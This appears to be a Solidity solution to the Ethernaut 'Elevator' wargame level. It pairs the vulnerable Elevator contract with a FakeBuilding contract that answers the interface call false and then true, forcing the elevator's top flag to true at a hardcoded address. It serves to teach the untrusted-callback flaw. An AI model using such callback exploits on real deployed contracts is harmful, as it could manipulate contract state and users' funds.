//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract FakeBuilding is Building {
    Elevator elevator = Elevator(0xB8f76828529fc9100Cf323732ab3999935FcFc05);
    bool public counter = false;

    function moveFloor() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint floor) external returns (bool) {
        if(!counter) {
            counter = true;
            return false;
        } else {
            return true;
        }
    }

}